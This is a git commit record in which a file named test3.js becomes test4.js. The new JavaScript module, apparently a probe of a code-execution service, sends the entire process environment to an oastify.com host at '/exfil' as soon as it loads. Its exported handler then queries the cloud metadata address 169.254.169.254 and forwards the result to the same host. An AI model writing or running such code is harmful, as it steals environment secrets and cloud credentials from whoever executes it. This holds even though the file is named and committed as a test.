b2cb62857de9f35e71f97dfed1ea9d0a5bec51c2
Martin <martinbydefault@gmail.com>
2024-05-21 08:42:02 -0300

    Update and rename test3.js to test4.js

--- test3.js
+++
@@ -1,9 +0,0 @@
-const axios = require('axios');
-
-axios.get('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere')
-
-module.exports = (context, req, res) => {
-  axios.get('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2')
-  return true;
-};
-
---
+++ test4.js
@@ -0,0 +1,10 @@
+const axios = require('axios');
+
+axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env);
+
+module.exports = (context, req, res) => {
+  result = axios.get('http://169.254.169.254')
+  axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2', result)
+  return true;
+};
+
